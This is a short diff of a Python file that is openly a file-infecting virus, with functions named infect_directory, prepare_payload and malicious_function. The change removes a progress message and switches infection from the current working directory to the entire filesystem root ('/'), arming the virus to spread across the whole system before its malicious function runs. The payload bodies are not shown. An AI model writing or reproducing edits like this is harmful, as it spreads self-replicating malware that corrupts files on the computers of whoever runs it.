@@ -63,7 +63,6 @@ def infect_directory(path, virus_payload):
     # infect current directory
     infection_count = 0
     directory_count = 0
-    print("Counting directory total...")
     total_directories = sum(1 for _ in os.walk(path))
     print("Infecting computer...")
     for current_directory, subdirectories, files in os.walk(path):
@@ -151,11 +150,11 @@ virus_payload = prepare_payload()
 
 # step 2: search for and infect potential hosts
 # infect entire directory
-# infect_directory('/', virus_payload)
+infect_directory('/', virus_payload)
 
 # infect current directory only
-current_directory = os.getcwd()
-infect_directory(current_directory, virus_payload)
+# current_directory = os.getcwd()
+# infect_directory(current_directory, virus_payload)
 
 # step 3: malicious function
 malicious_function()
